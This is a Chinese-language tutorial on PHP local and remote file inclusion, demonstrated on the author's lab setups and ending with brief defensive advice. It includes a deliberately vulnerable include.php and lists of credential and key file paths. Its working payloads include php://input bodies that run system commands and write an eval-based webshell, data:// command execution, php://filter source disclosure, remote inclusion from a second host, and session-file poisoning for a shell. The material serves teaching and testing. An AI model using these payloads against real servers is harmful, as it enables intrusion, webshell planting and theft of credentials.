## 文件包含漏洞原理

在网站后端代码开发中，程序员为了提高效率，以及让代码看起来更简洁，会使用“包含”函数功能，比如把一系列的功能函数，基础的类，基础的方法写进function.php中，之后某个文件需要调用的时候，就直接在那个文件头中写上一句代码<?php
include 'fuinction.php';?>就可以调用函数代码

文件包含常见函数漏洞点讲解

## 文件包含漏洞形成原理

因为网站功能的需求，会让客户端用户选择需要包含的文件(或者在前端的功能中使用了“包含”)，又由于程序员对要包含的文件没有进行安全方面的考虑，就导致了攻击者可以修改包含文件的位置来让后台执行任意代码文件。

## PHP中引发文件包含漏洞的通常是以下四个函数:

    
    
    include ()
    include_once()
    require()
    require_once()

## 文件包含漏洞应用场景

a)具有相关文件包含函数

b)文件包含函数中存在动态变量,比如include $file;

c)攻击者能够控制该变量，比如$file=$_GET['file'];

d)file page等参数

## 文件包含技巧之图片木马包含

include.php文件代码如下:

    
    
    <?php
    $file = $_GET['file'];
    include $file;
    ?>

1.txt文件

    
    
    <?php phpinfo();?>

通过include文件内的文件包含函数包含我们上传的图片木马，从而去执行图片木马的php代码。

将上面两个文件放入根目录下并进行访问include.php

![1626437360_60f176f0e2bb3b257e775.png!small?1626437361409](https://image.3001.net/images/20210716/1626437360_60f176f0e2bb3b257e775.png!small?1626437361409)

这时，include.php就会解析1.txt文件

## 本地文件包含（LFI）

LFI本地文件包含漏洞主要是包含本地服务器上存储的一些文件，例如session文件、日志文件、临时文件等。同时借助此漏洞也可以查看服务器上的一些重要文件。但是，只有我们能够控制包含的文件存储我们的恶意代码才能拿到服务器权限。

##  **windows常见的敏感文件路径：**

    
    
    C:\boot.ini//查看系统版本
    C:\Windows\System32\inetsrv\MetaBase.xml//Is配置文件
    C:\Windows\repair\sam//存储系统初次安装的密码
    C:\Program Files\mysql\my.ini //Mysql配置
    C:\Program Files\mysql\data\mysqI\user.MYD //Mysql root
    C:\Windows\php.ini//php配置信息
    C:\Windows\my.ini //Mysql配置信息
    C:\Windows\win.ini//Windows系统的基本系统配置文件

一个比较基本的存在有包含漏洞的代码

    
    
    <?php
          $file=$_GET['file'];
           include $file;
    ?>

在自己搭建的环境下

将index.php文件改成如下：

![1626437395_60f17713973cfd9c20c0d.png!small?1626437395956](https://image.3001.net/images/20210716/1626437395_60f17713973cfd9c20c0d.png!small?1626437395956)

也可以查看Windows系统的基本系统配置文件

![1626437408_60f1772092671bee1df51.png!small?1626437408948](https://image.3001.net/images/20210716/1626437408_60f1772092671bee1df51.png!small?1626437408948)

##  **Linux常见的敏感文件路径：**

    
    
    /root/.ssh/authorized_keys
    /root/.ssh/id_rsa
    /root/.ssh/id_ras.keystore
    /root/.ssh/known_hosts//记录每个访问计算机用户的公钥
    /etc/passwd//存放账户的文件
    /etc/shadow//存放密码的文件
    /etc/my.cnf //mysql配置文件
    /etc/httpd/conf/httpd.conf //apache配置文件
    /root/.bash_history //用户历史命令记录文件
    /root/.mysql_history //mysql历史命令记录文件
    /proc/mounts//记录系统挂载设备
    /porc/config.gz//内核配置文件
    /var/lib/mlocate/mlocate.db//全文件路径
    /porc/self/cmdline//当前进程的cmdline参数

事前在自己的lunix靶机根目录下写个简单的文件包含漏洞1.php

![1626437421_60f1772d3ef1974615b41.png!small?1626437421707](https://image.3001.net/images/20210716/1626437421_60f1772d3ef1974615b41.png!small?1626437421707)

在写个1.html

![1626437434_60f1773a9a65393a3f76b.png!small?1626437434945](https://image.3001.net/images/20210716/1626437434_60f1773a9a65393a3f76b.png!small?1626437434945)

利用文件包含查看

http://192.168.0.134/1.php?file=1.html

![1626437445_60f17745dcbe26f7ad8bb.png!small](https://image.3001.net/images/20210716/1626437445_60f17745dcbe26f7ad8bb.png!small)

在利用文件包含漏洞，查看存放账号的地方/etc/passwd

http://192.168.0.134/1.php?file=/etc/passwd

![1626437458_60f177525a6e37bd3d0d9.png!small?1626437458780](https://image.3001.net/images/20210716/1626437458_60f177525a6e37bd3d0d9.png!small?1626437458780)

## 远程文件包含（RFI）

RFI(Remote File
Inclusion)远程文件包含漏洞。是指能够包含远程服务器上的文件并执行。由于远程服务器的文件是我们可控的,因此漏洞一旦存在危害性会很大。但RFl的利用条件较为苛刻，需要php.ini中进行配置

###  **条件：**

1、allow_url_fopen = On

该选项为on便是激活了URL形式的fopen封装协议使得可以访问URL对象文件等。

2、allow_url_include: On

该选项为on便是允许包含URL对象文件等

###  **演示（在之前文件的前提下）**

http://127.0.0.1/sqllab/Less-1/include.php?file=http://192.168.0.134/1.php?file=1.html

![1626437472_60f1776014c957f12193b.png!small?1626437472409](https://image.3001.net/images/20210716/1626437472_60f1776014c957f12193b.png!small?1626437472409)

###

## PHP伪协议类型

    
    
    file://一访问本地文件系统
    http://一访问HTTP(s)网址
    ftp://一访问FTP(s) URLs
    php://一访问各个输入/输出流(I/O streams)
    zlib://一压缩流
    data://一数据（RFC 2397)
    glob://―查找匹配的文件路径模式
    phar:// —PHP归档
    ssh2:// - Secure Shell 2
    rar:// 一 RAR
    ogg:/一音频流
    expect:// 一处理交互式的流

###  **常用PHP伪协议讲解**

 **a）php://input**

它是个可以访问请求的原始数据的只读流，说得简单点，就是获取post传过去的数据

###  ** **利用条件:****

allow_url_include = on

（其他选项菜单--->PHP扩展及设置----->参数开关设置----->allow_url_include）

对allow_url_fopen不做要求

###  ** **利用方式:****

> index.php?file=php://input

POST:

    
    
    <?php phpinfo();?>
    <?php system('ipconfig');?>
    <?php fputs(fopen('shell.php', 'w'), '<?php eval($_POST[cmd])?>');?>

 **演示：**

将include.php文件放入sqllab靶场的第一关

include.php代码如下

    
    
    <?php
    
    $file=$_GET['file'];
    
    include $file;
    
    ?>
    
    打开游览器访问sqllab
    
    http://127.0.0.1/sqllab/Less-1/include.php?file=php://input
    
    利用post请求发送

 **1, <?php phpinfo();?>**

![1626437487_60f1776fd3e64627f57b8.png!small?1626437488287](https://image.3001.net/images/20210716/1626437487_60f1776fd3e64627f57b8.png!small?1626437488287)

 **2, <?php system('ipconfig');?>**

![1626437501_60f1777de8a7147bba14c.png!small?1626437502515](https://image.3001.net/images/20210716/1626437501_60f1777de8a7147bba14c.png!small?1626437502515)

 **3, <?php fputs(fopen('shell.php', 'w'), '<?php eval($_POST[cmd])?>');?>**

写一句木马进去

![1626437512_60f17788ea7e1710a2cf9.png!small?1626437513455](https://image.3001.net/images/20210716/1626437512_60f17788ea7e1710a2cf9.png!small?1626437513455)

这时是空白的

到当前目录查看

![1626437524_60f177949e6db20590b44.png!small?1626437524972](https://image.3001.net/images/20210716/1626437524_60f177949e6db20590b44.png!small?1626437524972)

接下来可以用菜刀，蚁剑进行连接

 **b) php:/ /filter**

我们一般用它来读取源码，不过要先经过base64加密，然后得到结果再base64解密就行.

利用方式:

> index.php?page=php://filter/read=convert.base64-encode/resource=file1.php
>
> index.php?page=php://filter/read=convert.base64-decode/resource=file1.php

 **演示：**

利用获取该目录下的index.php文件

<http://127.0.0.1/sqllab/Less-1/include.php?file=php://filter/read=convert.base64-encode/resource=index.php>

![1626437541_60f177a5c81635449d757.png!small?1626437542251](https://image.3001.net/images/20210716/1626437541_60f177a5c81635449d757.png!small?1626437542251)

使用base64解密，成功将index.php解读出来

![1626437555_60f177b38023111da7543.png!small?1626437555906](https://image.3001.net/images/20210716/1626437555_60f177b38023111da7543.png!small?1626437555906)

 **c)phar://**

 **利用条件**

php版本大于等于php5.3.0

 **利用方式:**

> 假设有个文件phpinfo.txt，其内容为<?php phpinfo();?>，打包成zip的压缩包，然后包含。
>
> index.php?page= phar://../ ../sqllab\Less-1/phpinfo.zip/phpinfo.txt

 **演示：**

将压缩文件放置在根目录下

>
> http://127.0.0.1/sqllab/Less-1/include.php?file=phar://phpinfo.zip/phpinfo.txt

![1626437569_60f177c1db2a26a50c5c5.png!small?1626437570277](https://image.3001.net/images/20210716/1626437569_60f177c1db2a26a50c5c5.png!small?1626437570277)

 **d) zip;://**

 **利用条件:**

php版本大于等于php5.3.0

利用方式：

假设有个文件phpinfo.txt，其内容为<?php
phpinfo();?>，打包成zip的压缩包，然后包含。但使用zip协议，需要指定绝对路径，同时将编码#改为URL编码%23，之后填上压缩包文件。

> index.php? page=zip://D:\phpstudy\PHPTutorial\www\DVWA-> master\vulnerabilities\fi\phpinfo.zip%23phpinfo.txt

 **演示:**

>
> http://127.0.0.1/sqllab/Less-1/include.php?file=zip://D:\phpStudy\PHPTutorial\WWW\sqllab\Less-1\phpinfo.zip%23phpinfo.txt

![1626437588_60f177d466f5db7fafce5.png!small?1626437588802](https://image.3001.net/images/20210716/1626437588_60f177d466f5db7fafce5.png!small?1626437588802)

e) data:URl schema

 **利用条件:**

> php版本大于等于php5.2

> allow_url_include = on

> allow_url_fopen = on

 **利用方式:.**

    
    
    index.php?file=data:text/plain,<?php phpinfo();?>
    
    index.php?file=data:text/plain,<?php system("whoami");?>

 **演示：**

http://127.0.0.1/sqllab/Less-1/include.php?file=data:text/plain,<?php
phpinfo();?>

![1626437605_60f177e5af2ddb215e594.png!small?1626437606069](https://image.3001.net/images/20210716/1626437605_60f177e5af2ddb215e594.png!small?1626437606069)

http://127.0.0.1/sqllab/Less-1/include.php?file=data:text/plain,<?php
system("whoami");?>

![1626437617_60f177f168beecab446c7.png!small?1626437617736](https://image.3001.net/images/20210716/1626437617_60f177f168beecab446c7.png!small?1626437617736)

###

### 通过session文件包含getshell

 **session简介：**

cookje存在客户端,session存在服务端，cookie一般用来保存用户得账户密码，tession一般用来跟踪会话。

说明:一般对于登陆点存在注册用户的，那么就可以起一个为payload的名字，这样会将payload保存在session文件中

 **利用条件:**

①session文件路径已知②且其中部分内容可控制

session文件路径位置可以通过phpinfo页面来获取,seesion_save_path也可以猜测常见的一些session存储位置:

    
    
    /var/lib/php/sess_PHPSESSID
    /tmp/sess_PHPSESSID

 **演示：**

演示环境：事先将一个phpinfo.php文件放入sqllab靶场中

![1626437634_60f17802e2400efd424cd.png!small?1626437635371](https://image.3001.net/images/20210716/1626437634_60f17802e2400efd424cd.png!small?1626437635371)

由于靶场的session是不可控的，所以在sqllab靶场里放一个session.php使session可控

![1626437644_60f1780c7c4952d7b6474.png!small?1626437645048](https://image.3001.net/images/20210716/1626437644_60f1780c7c4952d7b6474.png!small?1626437645048)

开始操作：

当你拿到一个目标站点的时候，你会发现对方有一个phpinfo的信息泄露，可以利用phpinfo的信息来找到session文件存储的路径

![1626437653_60f17815c3f0f5783162d.png!small?1626437654145](https://image.3001.net/images/20210716/1626437653_60f17815c3f0f5783162d.png!small?1626437654145)

http://127.0.0.1/sqllab/Less-1/session.php?inc=<?php phpinfo();?>

![1626437664_60f178201f2e1c78673ae.png!small?1626437664439](https://image.3001.net/images/20210716/1626437664_60f178201f2e1c78673ae.png!small?1626437664439)

然后我们根据路径去查看session文件

![1626437677_60f1782db5e4284571593.png!small?1626437678082](https://image.3001.net/images/20210716/1626437677_60f1782db5e4284571593.png!small?1626437678082)

发现已经将命令发送在session文件中

将文件名复制

> sess_anqjukmq0me76bo0asv5admkt2

这时我们就开始利用文件包含

>
> http://127.0.0.1/sqllab/Less-1/include.php?file=D:\phpStudy\PHPTutorial\tmp\tmp\sess_anqjukmq0me76bo0asv5admkt2

![1626437696_60f17840b47fd4e27c1b6.png!small?1626437697092](https://image.3001.net/images/20210716/1626437696_60f17840b47fd4e27c1b6.png!small?1626437697092)

发现能成功getshell

# 防御方案

在很多场景中都需要去包含web目录之外的文件，如果php配置了open_B asedir，则会包含失败。所以PHP 中使用open_B
asedir配置限制访问在指定的区域。

做好文件的权限管理。对可以包含的文件进行限制，可以采用白名单的方式，或设置可以包含的目录。对危险字符进行过滤，比如过滤.（点）/（反斜杠）\（反斜杠）等特殊字符。

尽量将allow_url_fopen和allow_url_include配置为off，不过像有些伪协议还是能使用，不过能尽量off还是off吧。尽量不使用动态包含等等

